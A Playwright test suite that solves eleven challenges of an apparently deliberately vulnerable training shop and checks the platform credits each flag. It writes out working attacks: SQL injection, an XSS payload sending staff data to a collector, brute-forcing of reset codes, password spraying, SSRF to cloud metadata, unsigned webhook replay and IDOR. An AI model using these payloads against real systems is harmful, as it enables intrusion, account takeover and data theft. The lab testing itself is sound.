// See playwright.live.config.mjs. Each challenge is played the way its brief, start state and hints say: in the console (start the lab, begin the challenge, read the text) and in the shop tab
// (menus, links, forms; a request made from the page's own console stands in for Burp). The answer is then checked the way the learner would: the platform must have counted the flag.
import { createHash } from 'node:crypto';
import { expect, test } from '@playwright/test';

const EMAIL = process.env.VM_XP_EMAIL_1;
const PASSWORD = process.env.VM_XP_PASSWORD_1;
const ONLY = process.env.VM_ONLY ? process.env.VM_ONLY.split(',') : null;
const FLAG = /VM\{[A-Z2-7]{24}\}/;
const CUSTOMER = ['player.customer@vulnmart.test', 'player-customer-demo-b2'];
const OWNER = ['owner.harbor@vulnmart.test', 'vulnmart-seed-demo'];
const STAFF = ['staff.harbor@vulnmart.test', 'harbor-staff-demo-a1'];

test.describe.configure({ mode: 'serial' });

let page; let context; let csrfToken = '';

// ---- the console ----
async function api(method, path, body) {
  return page.evaluate(async ([m, p, b, c]) => {
    const r = await fetch(p, { method: m, headers: { accept: 'application/json', ...(b ? { 'content-type': 'application/json', 'x-csrf-token': c } : {}) }, body: b ? JSON.stringify(b) : undefined });
    return { status: r.status, data: await r.json().catch(() => null) };
  }, [method, path, body ?? null, csrfToken]);
}

test.beforeAll(async ({ browser }) => {
  context = await browser.newContext();
  page = await context.newPage();
  page.on('dialog', (d) => d.accept());
  await page.goto('/login');
  await page.getByLabel('Email').fill(EMAIL);
  await page.getByLabel('Password').fill(PASSWORD);
  await page.getByRole('button', { name: 'Sign in' }).click();
  await expect(page.locator('#lab')).toBeVisible();
  csrfToken = (await api('GET', '/api/v1/session')).data.csrf_token;
  // a clean start: finish any run still open (the learner's own "Finish this run")
  if (!process.env.VM_KEEP) { // VM_KEEP=1 carries on in the run left by the earlier challenge (a challenge opens when the one before it is captured)
    for (const a of (await api('GET', '/api/v1/me/attempts')).data.items.filter((x) => x.mode === 'learner' && ['ready', 'running'].includes(x.state))) {
      await api('POST', `/api/v1/attempts/${a.attempt_id}/submit`, { confirm: true });
    }
  }
  await page.reload();
});

async function currentAttempt() {
  return (await api('GET', '/api/v1/me/attempts')).data.items.find((x) => x.mode === 'learner' && ['ready', 'running'].includes(x.state));
}

async function ensureLab() {
  const start = page.getByRole('button', { name: /Start my lab|Start a new run|Build a new shop/ });
  const begin = page.getByRole('button', { name: /^Begin challenge/ });
  await expect(start.first().or(page.locator('#i-state', { hasText: 'running' })).or(begin).or(page.locator('.flag-input'))).toBeVisible({ timeout: 30_000 });
  if ((await start.count()) > 0 && (await start.first().isVisible())) await start.first().click();
  // the console used to stay on the old finished run when Start was pressed during a read (fixed in this branch); a learner would reload once
  const deadline = Date.now() + 150_000; let lastReload = Date.now();
  while (Date.now() < deadline) {
    const st = await page.locator('#i-state').innerText();
    if (st === 'running') return;
    // a state that is neither running nor the new lab being built means the page is still showing the old run: reload, as a learner would
    if (st !== 'starting' && Date.now() - lastReload > 20_000) { console.log(`  (the console still says "${st}"; reloading the page)`); await page.reload(); lastReload = Date.now(); }
    await page.waitForTimeout(1000);
  }
  await expect(page.locator('#i-state')).toHaveText('running', { timeout: 1000 });
}

/** Press Begin when the challenge has not begun; read what the learner is told. */
async function beginChallenge(key) {
  await page.bringToFront();
  const begin = page.getByRole('button', { name: /^Begin challenge/ });
  await expect(begin.or(page.locator('.flag-input'))).toBeVisible({ timeout: 60_000 });
  if ((await begin.count()) > 0) await begin.click();
  await expect(page.locator('.flag-input')).toBeVisible();
  const title = await page.locator('.m-title').first().innerText();
  const brief = await page.locator('.m-body .lede').first().innerText();
  const how = await page.locator('.m-body .box').first().innerText().catch(() => '(no start text)');
  console.log(`\n=== ${key}: ${title}\n  brief: ${brief}\n  start: ${how.replace(/\s+/g, ' ')}`);
  const hint1 = page.locator('.hint').first().getByRole('button', { name: 'Reveal' });
  if ((await hint1.count()) > 0) { await hint1.click(); await expect(page.locator('.hint.open .txt').first()).toBeVisible(); console.log(`  hint 1: ${(await page.locator('.hint.open .txt').first().innerText()).trim()}`); }
}

async function openShop() {
  const [popup] = await Promise.all([context.waitForEvent('page'), page.locator('.m-body').getByRole('button', { name: 'Open the shop in a new tab' }).click()]);
  popup.on('pageerror', (e) => console.log(`  [shop page error] ${String(e.message).slice(0, 200)}`));
  popup.on('console', (m) => { if (m.type() === 'error') console.log(`  [shop console error] ${m.text().slice(0, 240)}`); });
  popup.on('requestfailed', (r) => console.log(`  [shop request failed] ${r.url().slice(-60)} ${r.failure()?.errorText}`));
  await popup.waitForURL(/^https?:\/\//, { timeout: 40_000 }); // the tab starts blank and is sent to the lab with the one-time ticket
  await popup.waitForLoadState('domcontentloaded');
  return popup;
}
const at = (s, path) => new URL(path, s.url()).href;

async function shopLogin(s, [email, password]) {
  await s.goto(at(s, '/login'));
  await s.getByLabel('Email').fill(email);
  await s.getByLabel('Password').fill(password);
  await s.getByRole('button', { name: 'Log in' }).click();
  await expect(s).toHaveURL(/\/shop/);
}

// a request made from the shop tab (same origin, the tab's cookie): what Burp Repeater or curl with the one-time link's cookie does
const shopReq = (s, path, { method = 'GET', fields, raw, headers = {} } = {}) => s.evaluate(async ([p, m, f, r, h]) => {
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content ?? '';
  const init = { method: m, headers: { ...h } };
  if (f) { init.headers['content-type'] = 'application/x-www-form-urlencoded'; init.body = new URLSearchParams({ ...f, csrf }).toString(); }
  if (r !== null && r !== undefined) init.body = r;
  const res = await fetch(p, init);
  return { status: res.status, text: await res.text() };
}, [path, method, fields ?? null, raw ?? null, headers]);

/** The platform's side: the flag the learner found must be counted (the lab sees it in the shop), and pasting it into the console's check must say so. */
async function expectCounted(key, flagText, s) {
  const att = await currentAttempt();
  let item;
  await expect.poll(async () => { item = (await api('GET', `/api/v1/attempts/${att.attempt_id}/challenges`)).data.items.find((x) => x.challenge_key === key); return item?.solved === true; }, { timeout: 40_000, intervals: [1500] }).toBe(true);
  const paste = await api('POST', `/api/v1/attempts/${att.attempt_id}/flags`, { challenge_key: key, flag: flagText });
  console.log(`  platform: ${key} counted (milestone ${item.best_milestone}); pasting the flag answers ${paste.status} ${paste.data?.result}`);
  expect(paste.data?.result).toBe('correct');
  if (s) await s.close();
  await page.bringToFront();
}

const run = (key) => (ONLY ? ONLY.includes(key) : true);
const flagIn = (text) => text.match(FLAG)?.[0] ?? null;

test('C01 Broken Access Control: staff login, Orders, open an order, try the numbers next to the listed ones', async () => {
  test.skip(!run('C01'));
  await ensureLab(); await beginChallenge('C01');
  const s = await openShop(); await shopLogin(s, STAFF);
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Orders' }).click();
  await expect(s.locator('table a[href^="/seller/orders/VM-"]').first()).toBeVisible();
  const listed = (await s.locator('table a[href^="/seller/orders/VM-"]').evaluateAll((as) => as.map((a) => Number(a.getAttribute('href').match(/VM-(\d+)/)[1]))));
  console.log(`  own orders listed: ${[...new Set(listed)].map((n) => `VM-${n}`).join(', ')}`);
  await s.locator('table a[href^="/seller/orders/VM-"]').first().click();
  await expect(s.locator('#order-body')).toBeVisible();
  const tried = new Set(listed); let found = null;
  for (const n of [...new Set(listed)]) for (const k of [n + 1, n - 1, n + 2, n - 2]) {
    if (found || tried.has(k)) continue; tried.add(k);
    await s.goto(at(s, `/seller/orders/VM-${k}`)); await s.waitForTimeout(600);
    found = flagIn(await s.locator('#order-note').innerText().catch(() => ''));
    if (found) console.log(`  the flag is in the buyer note of VM-${k}`);
  }
  expect(found).toBeTruthy();
  await expectCounted('C01', found, s);
});

test('C02 Cryptographic Failures: sign in, Gift cards, buy two cards, see the codes are a hash of the serial, forge card 1', async () => {
  test.skip(!run('C02'));
  await ensureLab(); await beginChallenge('C02');
  const s = await openShop(); await shopLogin(s, CUSTOMER);
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Gift cards' }).click();
  for (let i = 1; i <= 2; i += 1) { await s.getByRole('button', { name: 'Buy gift card' }).click(); await expect(s.locator('#receipts li')).toHaveCount(i); }
  const codes = await s.locator('#receipts li code').allTextContents();
  const serials = (await s.locator('#receipts li b').allTextContents()).map((t) => Number(t.replace('Card ', '')));
  const md5 = (n) => `VM-${createHash('md5').update(String(n)).digest('hex').slice(0, 12)}`;
  console.log(`  receipts: ${serials.map((n, i) => `card ${n} code ${codes[i]}`).join(' | ')}; md5(serial) first 12 hex matches: ${codes[0] === md5(serials[0])}`);
  expect(codes[0]).toBe(md5(serials[0]));
  await s.getByLabel('Gift card code').fill(md5(1));
  await s.getByRole('button', { name: 'Redeem' }).click();
  await expect(s.locator('#wallet-msg')).toContainText('VM{');
  const found = flagIn(await s.locator('#wallet-msg').innerText());
  console.log(`  flag shown in the redeem message: ${!!found}`);
  await expectCounted('C02', found, s);
});

test('C03 Injection: part A (search box) and part B (a script in a support ticket read by the agent)', async () => {
  test.skip(!run('C03'));
  await ensureLab(); await beginChallenge('C03');
  const s = await openShop();
  // part A needs no account
  await s.goto(at(s, '/shop'));
  await s.getByLabel('Search products').fill("'"); await s.getByRole('button', { name: 'Search' }).click();
  await expect(s.getByRole('alert')).toContainText('Search failed');
  await s.getByLabel('Search products').fill("zzz' UNION SELECT id,body,0,'notes' FROM ops_notes--"); await s.getByRole('button', { name: 'Search' }).click();
  const a = flagIn(await s.locator('.grid').innerText());
  console.log(`  part A: a flag-shaped note came back in the results: ${!!a}`);
  // part B: customer, Support, a message that holds a script; the Listener page shows what the agent's browser sent
  await shopLogin(s, CUSTOMER);
  await s.goto(at(s, '/lab/listener'));
  const collector = (await s.locator('pre.card').innerText()).trim();
  console.log(`  the Listener page gives the collector address: ${/^http/.test(collector)}`);
  await s.goto(at(s, '/tickets'));
  await s.getByLabel('Subject').fill('Where is my order?');
  await s.getByLabel('Message').fill(`<img src=x onerror="fetch('/staff/api/agent-profile').then(function(r){return r.text()}).then(function(t){new Image().src='${collector}?d='+encodeURIComponent(t)})">`);
  await s.getByRole('button', { name: 'Send to support' }).click();
  let b = null;
  for (let i = 0; i < 30 && !b; i += 1) { await s.waitForTimeout(3000); await s.goto(at(s, '/lab/listener')); b = flagIn(await s.locator('table').innerText()); }
  console.log(`  part B: the agent's browser delivered a flag-shaped value to the collector: ${!!b}`);
  expect(a || b).toBeTruthy();
  await expectCounted('C03', b || a, s);
});

test('C04 Insecure Design: Orders, open the delivered order, two quick refunds under the limit, read the statement', async () => {
  test.skip(!run('C04'));
  await ensureLab(); await beginChallenge('C04');
  const s = await openShop(); await shopLogin(s, CUSTOMER);
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Orders' }).click();
  await s.locator('table a[href^="/orders/"]').first().click();
  await expect(s.locator('#statement')).toContainText('Refunded so far');
  console.log(`  statement before: ${(await s.locator('#statement').innerText()).replace(/\s+/g, ' ')}`);
  for (let i = 0; i < 2; i += 1) { await s.getByLabel('Refund amount in cents').fill('1500'); await s.getByRole('button', { name: 'Refund now' }).click(); await expect(s.locator('#refund-msg')).toContainText('Refunded'); }
  await expect(s.locator('#statement')).toContainText('Goodwill adjustment');
  const found = flagIn(await s.locator('#statement').innerText());
  console.log(`  the goodwill line carries a flag: ${!!found}`);
  await expectCounted('C04', found, s);
});

test('C05 Security Misconfiguration: add to cart, see the /api/cart request, damage it, read the trace, open the page it names', async () => {
  test.skip(!run('C05'));
  await ensureLab(); await beginChallenge('C05');
  const s = await openShop(); // the start state: an anonymous visitor
  await s.goto(at(s, '/product/1'));
  if ((await s.getByRole('button', { name: 'Add to cart' }).count()) === 0) { // the shop build before the fix showed a visitor no Add to cart button
    console.log('  FINDING: an anonymous visitor sees no Add to cart on the product page, so the /api/cart request cannot be seen; logging in to carry on');
    await shopLogin(s, CUSTOMER); await s.goto(at(s, '/product/1'));
  }
  const seen = s.waitForRequest((r) => r.url().endsWith('/api/cart'));
  await s.getByRole('button', { name: 'Add to cart' }).click();
  await s.waitForURL(/\/(cart|login)/); await s.waitForLoadState('domcontentloaded'); // the form goes on to the cart (or to the login page for a visitor)
  console.log(`  the page sent ${(await seen).method()} ${new URL((await seen).url()).pathname} with body ${(await seen).postData()}`);
  const broken = await shopReq(s, '/api/cart', { method: 'POST', raw: '{"items": [', headers: { 'content-type': 'application/json' } });
  console.log(`  a damaged request answers ${broken.status}; the trace names: ${(broken.text.match(/\/[\w./-]*_ops[\w./-]*/) || ['(nothing)'])[0]}`);
  expect(broken.text).toContain('_ops');
  const ops = await shopReq(s, '/_ops/diagnostics');
  const found = flagIn(ops.text);
  console.log(`  /_ops/diagnostics without a login answers ${ops.status} and carries a flag: ${!!found}`);
  await expectCounted('C05', found, s);
});

test('C06 Supply chain: seller owner, Seller, Bulk import preview, a __proto__ key in the options', async () => {
  test.skip(!run('C06'));
  await ensureLab(); await beginChallenge('C06');
  const s = await openShop(); await shopLogin(s, OWNER);
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Seller' }).click();
  await s.getByRole('link', { name: 'Bulk import preview' }).click();
  await s.getByLabel('Title').fill('Mug'); await s.getByLabel(/Advanced options/).fill('{"tags":["gift"]}');
  await s.getByRole('button', { name: 'Preview' }).click();
  console.log(`  an ordinary preview shows: ${(await s.locator('body').innerText()).replace(/\s+/g, ' ').slice(0, 110)}`);
  await s.goBack();
  await s.getByLabel('Title').fill('Mug'); await s.getByLabel(/Advanced options/).fill('{"__proto__":{"internalAudit":true}}');
  await s.getByRole('button', { name: 'Preview' }).click();
  const found = flagIn(await s.locator('body').innerText());
  console.log(`  the polluted preview carries the audit token (a flag): ${!!found}`);
  await expectCounted('C06', found, s);
});

test('C07 Authentication Failures: Contact page, Forgot password for the finance mailbox, find the 4-digit code, sign in, Settlement', async () => {
  test.skip(!run('C07'));
  await ensureLab(); await beginChallenge('C07');
  const s = await openShop();
  await s.goto(at(s, '/contact'));
  const finance = (await s.locator('main').innerText()).match(/finance\.ops@vulnmart\.test/)?.[0];
  console.log(`  the Contact page names the finance mailbox: ${finance}`);
  await s.goto(at(s, '/login')); await s.getByRole('link', { name: 'Forgot your password?' }).click();
  await s.getByLabel('Email', { exact: true }).fill(finance);
  const asked = s.waitForResponse((r) => r.url().endsWith('/auth/forgot'), { timeout: 20_000 });
  await s.getByRole('button', { name: 'Send me a code' }).click();
  console.log(`  after the click the tab is at ${new URL(s.url()).pathname}${new URL(s.url()).search.replace(/email=[^&]+/, 'email=...')}`);
  const askedRes = await asked.catch(() => null);
  if (!askedRes) { console.log(`  FINDING: pressing Send me a code made no /auth/forgot request (script not running on this page?); script served: ${(await shopReq(s, '/assets/shop.js')).status}`); }
  else console.log(`  the page's forgot request: ${askedRes.status()} ${(await askedRes.text()).slice(0, 120)}; its body: ${askedRes.request().postData()?.replace(/csrf=[^&]+/, 'csrf=<token>')}`);
  await expect(s.locator('#reset-confirm')).toBeVisible();
  // a person cannot type 10,000 codes: a tool does (Burp Intruder, or a loop from the page's console)
  const result = await s.evaluate(async (mail) => {
    let taken = false; let next = 0; let tries = 0; const statuses = {}; let sample = '';
    const worker = async () => { while (!taken && next < 10000) { const guess = String(next++).padStart(4, '0'); const r = await fetch('/auth/reset/confirm', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ email: mail, code: guess, password: 'pwned-finance-pass-1' }).toString() }); tries += 1; statuses[r.status] = (statuses[r.status] || 0) + 1; const raw = await r.text(); if (!sample && r.status !== 400) sample = `${r.status} ${raw.slice(0, 120)}`; let j = {}; try { j = JSON.parse(raw); } catch { /* not JSON */ } if (j.reset) taken = true; } };
    await Promise.all(Array.from({ length: 40 }, worker));
    return { taken, tries, statuses, sample };
  }, finance);
  console.log(`  the code was found after ${result.tries} tries: ${result.taken}; answers seen: ${JSON.stringify(result.statuses)}; first unusual answer: ${result.sample || '(none)'}`);
  expect(result.taken).toBe(true);
  await s.goto(at(s, '/login')); await s.getByLabel('Email').fill(finance); await s.getByLabel('Password').fill('pwned-finance-pass-1'); await s.getByRole('button', { name: 'Log in' }).click();
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Settlement' }).click();
  const found = flagIn(await s.locator('main').innerText());
  console.log(`  the settlement page carries a flag: ${!!found}`);
  await expectCounted('C07', found, s);
});

test('C08 Integrity Failures: cart, Pay with PayGate, read the integration notes, replay the provider message without a signature', async () => {
  test.skip(!run('C08'));
  await ensureLab(); await beginChallenge('C08');
  const s = await openShop(); await shopLogin(s, CUSTOMER);
  await s.goto(at(s, '/product/1')); await s.getByRole('button', { name: 'Add to cart' }).click();
  await expect(s).toHaveURL(/\/cart/);
  await s.getByLabel('Address line 1').fill('1 Test Street'); await s.getByLabel('City').fill('Testville'); await s.getByLabel('Country').fill('Landia'); await s.getByLabel('Card number (simulated)').fill('4242424242424242');
  await s.getByRole('button', { name: /Pay with PayGate/ }).click();
  const notes = await s.locator('main').innerText();
  const order = notes.match(/"order_no": "(VM-\d+)", "amount_cents": (\d+)/);
  console.log(`  the pay page gives the webhook, the body example (${order?.[1]}, ${order?.[2]} cents) and the sandbox header: ${/X-Gateway-Mode: sandbox/.test(notes)}`);
  expect(order).toBeTruthy();
  const res = await shopReq(s, '/webhooks/payments', { method: 'POST', raw: JSON.stringify({ order_no: order[1], amount_cents: Number(order[2]), event_id: 'evt-1' }), headers: { 'content-type': 'application/json', 'x-gateway-mode': 'sandbox' } });
  const found = flagIn(res.text);
  console.log(`  the unsigned sandbox message answers ${res.status}; the payment reference is a flag: ${!!found}`);
  await expectCounted('C08', found, s);
});

test('C09 Logging Failures: footer Mobile app, the old login route, the support agent on Contact, a wordlist, then Case notes', async () => {
  test.skip(!run('C09'));
  await ensureLab(); await beginChallenge('C09');
  const s = await openShop();
  await s.goto(at(s, '/shop')); await s.getByRole('link', { name: 'Mobile app' }).click();
  console.log(`  the app page names the route: ${/\/m\/api\/v1\/login/.test(await s.locator('main').innerText())}`);
  await s.getByRole('link', { name: 'Contact us' }).click();
  const agent = (await s.locator('main').innerText()).match(/s\.iyer@vulnmart\.test/)?.[0];
  console.log(`  Contact names the support agent: ${agent}`);
  const words = ['123456', 'password', 'qwerty', 'letmein', 'welcome', 'admin', 'iloveyou', 'football', 'monkey', 'dragon', 'sunshine', 'princess', 'login', 'passw0rd', 'starwars', 'hello123', 'whatever', 'trustno1', 'master', 'shadow', 'baseball', 'superman', 'michael', 'summer2020', 'monday123!'];
  const got = await s.evaluate(async ([mail, list]) => { for (const pw of list) { const r = await fetch('/m/api/v1/login', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email: mail, password: pw }) }); if (r.status === 200) return pw.length; } return 0; }, [agent, words]);
  console.log(`  the wordlist found the agent's password (length ${got}); the session cookie is now in this tab`);
  expect(got).toBeGreaterThan(0);
  await s.goto(at(s, '/shop'));
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Case notes' }).click();
  const found = flagIn(await s.locator('main').innerText());
  console.log(`  the case notes carry a flag: ${!!found}`);
  await expectCounted('C09', found, s);
});

test('C10 SSRF: seller dashboard, Import a product image from a URL, the literal metadata address is refused, the decimal form is not', async () => {
  test.skip(!run('C10'));
  await ensureLab(); await beginChallenge('C10');
  const s = await openShop(); await shopLogin(s, OWNER);
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Seller' }).click();
  await s.getByLabel('Image URL').fill('http://169.254.169.254/latest/user-data'); await s.getByRole('button', { name: 'Import image' }).click();
  await expect(s.locator('#import-result')).toBeVisible();
  console.log(`  literal metadata address: ${(await s.locator('#import-msg').innerText()).trim()}`);
  await s.getByLabel('Image URL').fill('http://2852039166/latest/user-data'); await s.getByRole('button', { name: 'Import image' }).click();
  await expect(s.locator('#import-result')).toContainText('VM{');
  const found = flagIn(await s.locator('#import-result').innerText());
  console.log(`  the decimal form shows the metadata in the error, with a flag: ${!!found}`);
  await expectCounted('C10', found, s);
});

test('C11 Exceptional Conditions: a new customer account, Sell with us, the store form, a tax id the checker cannot read, Payouts', async () => {
  test.skip(!run('C11'));
  await ensureLab(); await beginChallenge('C11');
  const s = await openShop();
  await s.goto(at(s, '/register'));
  await s.getByLabel('Email').fill(`seller.${Date.now().toString(36)}@example.test`); await s.getByLabel('Password').fill('a-long-password'); await s.getByRole('button', { name: 'Create account' }).click();
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Sell with us' }).click();
  await expect(s.locator('input[name="tax_id"]')).toBeVisible();
  // the form sends tax_id=...; the hint says to send it in a shape the checker cannot read: tax_id[]=x, from the page's own console
  const reg = await shopReq(s, '/sell/register', { method: 'POST', fields: { name: 'Learner Goods', 'tax_id[]': 'x' } });
  console.log(`  the store form answered ${reg.status}: ${reg.text.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 90)}`);
  await s.goto(at(s, '/shop'));
  await s.getByRole('navigation', { name: 'Main' }).getByRole('link', { name: 'Payouts' }).click();
  const found = flagIn(await s.locator('main').innerText());
  console.log(`  the Payouts page carries a flag: ${!!found}`);
  await expectCounted('C11', found, s);
});
